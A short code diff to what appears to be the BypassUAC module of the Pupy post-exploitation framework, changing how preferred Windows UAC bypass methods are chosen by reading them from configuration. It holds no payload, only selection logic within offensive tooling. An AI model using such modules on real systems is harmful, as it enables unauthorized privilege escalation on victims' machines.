@@ -40,7 +40,8 @@ class BypassUAC(PupyModule):
         Return the best method id if possible
         """
         func = {'t': self.log, 'ok': self.success, 'error': self.error, 'info': self.info, 'warning': self.warning}
-        preferred_method = ('01', '02', '03', '04', '08', '09', '10')
+        preferred_methods = self.client.pupsrv.config.get("bypassuac", "preferred_methods").split(',')
+
         method_id = []
         for tag, message in result:
             if tag in func:
@@ -50,7 +51,7 @@ class BypassUAC(PupyModule):
                     method_id.append(message.split()[0])
 
         if get_method_id:
-            for p in preferred_method:
+            for p in preferred_methods:
                 if p in method_id:
                     return p
 
